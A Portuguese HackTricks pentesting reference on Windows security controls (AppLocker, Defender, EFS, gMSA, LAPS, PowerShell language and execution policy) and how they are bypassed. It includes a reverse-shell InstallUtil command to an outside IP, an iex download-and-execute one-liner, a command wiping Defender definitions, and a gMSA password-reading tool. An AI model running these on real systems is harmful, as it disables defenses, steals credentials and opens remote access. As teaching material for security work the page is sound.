# Controles de Segurança do Windows

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas comunitárias mais avançadas** do mundo.\
Tenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política do AppLocker

Uma lista branca de aplicativos é uma lista de aplicativos de software aprovados ou executáveis que podem estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente de malware prejudicial e software não aprovado que não esteja alinhado com as necessidades específicas de negócios de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de lista branca de aplicativos** da Microsoft e dá aos administradores do sistema controle sobre **quais aplicativos e arquivos os usuários podem executar**. Ele fornece **controle granular** sobre executáveis, scripts, arquivos de instalação do Windows, DLLs, aplicativos empacotados e instaladores de aplicativos empacotados.\
É comum para as organizações **bloquear cmd.exe e PowerShell.exe** e o acesso de escrita a determinados diretórios, **mas tudo isso pode ser contornado**.

### Verificação

Verifique quais arquivos/extensões estão na lista negra/lista branca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este caminho de registro contém as configurações e políticas aplicadas pelo AppLocker, fornecendo uma maneira de revisar o conjunto atual de regras aplicadas no sistema:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

* Pastas **graváveis** úteis para burlar a Política do AppLocker: Se o AppLocker estiver permitindo a execução de qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, existem **pastas graváveis** que você pode usar para **burlar isso**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Comumente, binários **confiáveis** do [**"LOLBAS's"**](https://lolbas-project.github.io/) também podem ser úteis para burlar o AppLocker.
* **Regras mal escritas também podem ser burladas**
* Por exemplo, com **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar e ela será permitida.
* Organizações frequentemente focam em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem dos **outros** [**locais executáveis do PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
* **A aplicação de DLLs raramente é ativada** devido à carga adicional que pode colocar em um sistema e à quantidade de testes necessários para garantir que nada quebrará. Portanto, usar **DLLs como backdoors ajudará a burlar o AppLocker**.
* Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e burlar o AppLocker. Para mais informações, acesse: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Armazenamento de Credenciais

### Gerenciador de Contas de Segurança (SAM)

Credenciais locais estão presentes neste arquivo, as senhas estão hashadas.

### Autoridade de Segurança Local (LSA) - LSASS

As **credenciais** (hashadas) são **salvas** na **memória** deste subsistema por motivos de Logon Único.\
**LSA** administra a **política de segurança** local (política de senha, permissões de usuários...), **autenticação**, **tokens de acesso**...\
LSA será o responsável por **verificar** as credenciais fornecidas dentro do arquivo **SAM** (para um login local) e **conversar** com o **controlador de domínio** para autenticar um usuário de domínio.

As **credenciais** são **salvas** dentro do **processo LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### Segredos do LSA

LSA pode salvar em disco algumas credenciais:

* Senha da conta de computador do Active Directory (controlador de domínio inacessível).
* Senhas das contas de serviços do Windows
* Senhas para tarefas agendadas
* Mais (senha de aplicações IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas nos Controladores de Domínio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) é um Antivírus disponível no Windows 10 e Windows 11, e em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting como **`WinPEAS`**. No entanto, existem maneiras de **burlar essas proteções**.

### Verificação

Para verificar o **status** do **Defender**, você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo, você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de Arquivos Criptografado (EFS)

O EFS protege arquivos por meio de criptografia, utilizando uma **chave simétrica** conhecida como **Chave de Criptografia de Arquivo (FEK)**. Essa chave é criptografada com a **chave pública** do usuário e armazenada dentro do $EFS **fluxo de dados alternativo** do arquivo criptografado. Quando a descriptografia é necessária, a **chave privada** correspondente do certificado digital do usuário é usada para descriptografar a FEK do fluxo $EFS. Mais detalhes podem ser encontrados [aqui](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Cenários de descriptografia sem iniciativa do usuário** incluem:

- Quando arquivos ou pastas são movidos para um sistema de arquivos não-EFS, como [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), eles são descriptografados automaticamente.
- Arquivos criptografados enviados pela rede via protocolo SMB/CIFS são descriptografados antes da transmissão.

Esse método de criptografia permite **acesso transparente** aos arquivos criptografados para o proprietário. No entanto, simplesmente alterar a senha do proprietário e fazer login não permitirá a descriptografia.

**Principais pontos**:

- O EFS usa uma FEK simétrica, criptografada com a chave pública do usuário.
- A descriptografia emprega a chave privada do usuário para acessar a FEK.
- A descriptografia automática ocorre sob condições específicas, como cópia para FAT32 ou transmissão pela rede.
- Arquivos criptografados são acessíveis ao proprietário sem etapas adicionais.

### Verificar informações do EFS

Verifique se um **usuário** utilizou esse **serviço** verificando se esse caminho existe: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos

### Descriptografando arquivos EFS

#### Sendo a Autoridade do Sistema

Este método requer que o **usuário vítima** esteja **executando** um **processo** dentro do host. Nesse caso, usando sessões `meterpreter`, você pode se passar pelo token do processo do usuário (`impersonate_token` do `incognito`). Ou você poderia simplesmente `migrar` para o processo do usuário.

#### Conhecendo a senha dos usuários

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Contas de Serviço Gerenciadas em Grupo (gMSA)

A Microsoft desenvolveu as **Contas de Serviço Gerenciadas em Grupo (gMSA)** para simplificar a gestão de contas de serviço em infraestruturas de TI. Ao contrário das contas de serviço tradicionais que frequentemente têm a configuração "**Senha nunca expira**" ativada, as gMSAs oferecem uma solução mais segura e gerenciável:

- **Gerenciamento Automático de Senhas**: As gMSAs usam uma senha complexa de 240 caracteres que muda automaticamente de acordo com a política de domínio ou computador. Esse processo é tratado pelo Serviço de Distribuição de Chaves (KDC) da Microsoft, eliminando a necessidade de atualizações manuais de senha.
- **Segurança Aprimorada**: Essas contas são imunes a bloqueios e não podem ser usadas para logins interativos, aumentando sua segurança.
- **Suporte a Múltiplos Hosts**: As gMSAs podem ser compartilhadas entre vários hosts, tornando-as ideais para serviços em execução em vários servidores.
- **Capacidade de Tarefas Agendadas**: Ao contrário das contas de serviço gerenciadas, as gMSAs suportam a execução de tarefas agendadas.
- **Gerenciamento Simplificado de SPN**: O sistema atualiza automaticamente o Nome Principal de Serviço (SPN) quando há alterações nos detalhes sAMaccount do computador ou nome DNS, simplificando o gerenciamento de SPN.

As senhas das gMSAs são armazenadas na propriedade LDAP _**msDS-ManagedPassword**_ e são redefinidas automaticamente a cada 30 dias pelos Controladores de Domínio (DCs). Essa senha, um bloco de dados criptografados conhecido como [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), só pode ser recuperada por administradores autorizados e pelos servidores nos quais as gMSAs estão instaladas, garantindo um ambiente seguro. Para acessar essas informações, é necessária uma conexão segura, como LDAPS, ou a conexão deve ser autenticada com 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Você pode ler essa senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encontre mais informações neste post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Também, confira esta [página da web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um ataque de **retransmissão NTLM** para **ler** a **senha** do **gMSA**.

## LAPS

A **Local Administrator Password Solution (LAPS)**, disponível para download na [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite a gestão das senhas dos administradores locais. Essas senhas, que são **aleatórias**, únicas e **alteradas regularmente**, são armazenadas centralmente no Active Directory. O acesso a essas senhas é restrito por ACLs a usuários autorizados. Com permissões suficientes concedidas, é possível ler as senhas dos administradores locais.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Linguagem Constrainda do PowerShell

O PowerShell [**Modo de Linguagem Constrainda**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **restringe muitos dos recursos** necessários para usar o PowerShell de forma eficaz, como bloquear objetos COM, permitir apenas tipos .NET aprovados, fluxos de trabalho baseados em XAML, classes do PowerShell e mais.

### **Verificar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass

### Ignorar
```powershell
#Easy bypass
Powershell -version 2
```
No Windows atual, o Bypass não funcionará, mas você pode usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo, você pode precisar** **adicionar uma Referência** -> _Procurar_ -> _Procurar_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell reverso:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de Execução do PS

Por padrão, ela é definida como **restrita**. Principais maneiras de contornar essa política:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
## Interface de Provedor de Suporte de Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI será responsável por encontrar o protocolo adequado para duas máquinas que desejam se comunicar. O método preferido para isso é o Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado, esses protocolos de autenticação são chamados de Provedor de Suporte de Segurança (SSP), estão localizados dentro de cada máquina Windows na forma de um DLL e ambas as máquinas devem suportar o mesmo para poder se comunicar.

### Principais SSPs

- **Kerberos**: O preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Razões de compatibilidade
- %windir%\Windows\System32\msv1\_0.dll
- **Digest**: Servidores web e LDAP, senha na forma de um hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: É usado para negociar o protocolo a ser usado (Kerberos ou NTLM, sendo o Kerberos o padrão)
- %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - Controle de Conta de Usuário

[Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite uma **solicitação de consentimento para atividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
- **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
